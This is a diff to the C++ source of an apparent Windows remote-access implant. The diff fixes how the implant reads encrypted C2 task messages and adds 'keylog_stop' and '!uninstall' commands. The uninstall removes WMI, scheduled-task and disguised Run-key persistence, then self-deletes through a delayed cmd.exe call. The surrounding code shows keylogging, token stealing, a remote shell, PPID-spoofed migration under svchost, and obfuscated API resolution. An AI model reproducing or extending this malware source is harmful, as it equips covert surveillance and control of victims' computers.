@@ -5,6 +5,7 @@
 #include "evasion.hpp"
 #include "injection.hpp"
 #include "keylog.hpp"
+#include "persistence.hpp"
 #include "vnc.hpp"
 #include "obfuscate.hpp"
 #include <windows.h>
@@ -451,7 +452,10 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
 
     std::string cmd = JsonGetString(resp.body, "cmd");
     if (!cmd.empty()) {
-        if (JsonGetString(resp.body, "e") == "1") {
+        // "e" is a numeric flag ({"e":1,...}) — JsonGetString can't read
+        // number values (it would grab the next quoted text), so detect the
+        // marker by substring instead.
+        if (resp.body.find("\"e\":1") != std::string::npos) {
             // Encrypted blob decrypts to {"cmd":"<task>"} — unpack the field.
             std::string dec = AesGcmDecrypt(g_SessionKey, cmd);
             if (dec.empty()) {
@@ -658,8 +662,8 @@ static std::wstring HandleMigrate(const std::string& args) {
     wchar_t selfPath[MAX_PATH] = {};
     GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
 
-    // Set sentinel so the child skips TryRespawnUnderSvchost and also
-    // skips the mutex check (we'll release it when WinMain exits after 0xDEAD).
+    // Set sentinel so the child skips the mutex check (we'll release it when
+    // WinMain exits after 0xDEAD).
     SetEnvironmentVariableW(L"__GHOST_SPAWNED", L"1");
     HANDLE hChild = nullptr, hThread = nullptr;
     if (!SpawnWithPPID(selfPath, svchostPid, &hChild, &hThread)) {
@@ -964,6 +968,60 @@ static std::wstring HandleKeylogStart(const std::string& /*args*/) {
 static std::wstring HandleKeylogDump(const std::string& /*args*/) {
     if (!KeylogRunning()) return L"[keylog: not running — use keylog_start first]";
     return KeylogDump();
+}
+
+static std::wstring HandleKeylogStop(const std::string& /*args*/) {
+    if (!KeylogRunning()) return L"[keylog: not running]";
+    KeylogStop();
+    return L"[+] Keylogger stopped";
+}
+
+// ─── Full uninstall — kill persistence, then exit for good ───────────────────
+static std::wstring HandleUninstall(const std::string& /*args*/) {
+    wchar_t selfPath[MAX_PATH] = {};
+    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
+    std::wstring out;
+    out += RemoveWmiPersistence() ? L"[+] WMI persistence removed\n"
+                                  : L"[-] WMI cleanup failed\n";
+    out += RemoveScheduledTaskPersistence() ? L"[+] Scheduled task removed\n"
+                                            : L"[-] Scheduled task removal failed\n";
+    // Run keys (HKCU always; HKLM when elevated)
+    auto hAdv = GetModuleHandleA(XS("advapi32.dll"));
+    if (hAdv) {
+        auto _RegOpenKeyExW  = HASHPROC(hAdv, RegOpenKeyExW);
+        auto _RegDeleteValueW = HASHPROC(hAdv, RegDeleteValueW);
+        auto _RegCloseKey    = HASHPROC(hAdv, RegCloseKey);
+        wchar_t runKeyStr[80] = {};
+        { auto tmp = XSW(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+          wcsncpy_s(runKeyStr, tmp.str(), _TRUNCATE); }
+        auto delRun = [&](HKEY root) {
+            HKEY h = nullptr;
+            if (_RegOpenKeyExW && _RegDeleteValueW && _RegCloseKey &&
+                _RegOpenKeyExW(root, runKeyStr, 0, KEY_SET_VALUE, &h) == ERROR_SUCCESS) {
+                _RegDeleteValueW(h, L"WindowsStorageService");
+                _RegCloseKey(h);
+                return true;
+            }
+            return false;
+        };
+        out += delRun(HKEY_CURRENT_USER) ? L"[+] HKCU Run value removed\n"
+                                         : L"[-] HKCU Run value not found\n";
+        if (IsElevated())
+            out += delRun(HKEY_LOCAL_MACHINE) ? L"[+] HKLM Run value removed\n"
+                                              : L"[-] HKLM Run value not found\n";
+    }
+    // Self-delete, then exit for good
+    std::wstring delCmd = L"cmd.exe /c ping -n 3 127.0.0.1 >nul & del /f /q \""
+                        + std::wstring(selfPath) + L"\"";
+    STARTUPINFOW si = {}; si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = {};
+    CreateProcessW(nullptr, &delCmd[0], nullptr, nullptr, FALSE,
+                   CREATE_NO_WINDOW | DETACHED_PROCESS, nullptr, nullptr, &si, &pi);
+    if (pi.hProcess) CloseHandle(pi.hProcess);
+    if (pi.hThread)  CloseHandle(pi.hThread);
+    out += L"[+] uninstall complete — implant exits and self-deletes";
+    g_MigrateExit = 1;  // reuse the clean-exit sentinel → BeaconLoop returns 0xDEAD
+    return out;
 }
 
 // =====================================================================
@@ -1475,9 +1533,11 @@ static const CmdEntry kCmdTable[] = {
     { "!prank",        true,  HandlePrank },
     { "!popups",       true,  HandlePopups },
     { "!popups ",      false, HandlePopups },
+    { "!uninstall",    true,  HandleUninstall },
     { "steal_token",   true,  HandleStealToken },
     { "keylog_start",  true,  HandleKeylogStart },
     { "keylog_dump",   true,  HandleKeylogDump },
+    { "keylog_stop",   true,  HandleKeylogStop },
     { "sleep ",        false, HandleSleepCmd },
     { "!shell",        true,  HandleShellMode },
     { "!shell ",       false, HandleShellMode },
